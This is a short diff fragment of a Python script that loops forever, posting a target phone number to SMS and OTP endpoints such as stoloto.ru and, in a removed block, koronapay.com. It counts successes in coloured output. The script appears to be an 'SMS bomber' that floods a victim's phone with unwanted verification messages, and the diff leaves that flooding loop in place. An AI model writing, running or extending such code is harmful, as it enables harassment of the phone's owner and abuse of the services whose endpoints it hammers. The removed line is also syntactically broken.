@@ -142,17 +142,6 @@ while True:
 	_email = _name+f'{iteration}'+'@gmail.com'
 	email = _name+f'{iteration}'+'@gmail.com'
 	try:
-		requests.post(https://koronapay.com/transfers/online/api/users/otps',data={'phone': _phone})
-		print(random.choice(colors))		
-		print("Successful Requests   : ", success)
-	except:
-		print('[-] Korona Requests Failed!')
-	try:        
-                success += 1
-
-	except:
-                failed += 1
-	try:
 		requests.post('https://www.stoloto.ru:443/send-mobile-app-link',data={'phone':_phone})
 		print(random.choice(colors))		
 		print("Successful Requests   : ", success)
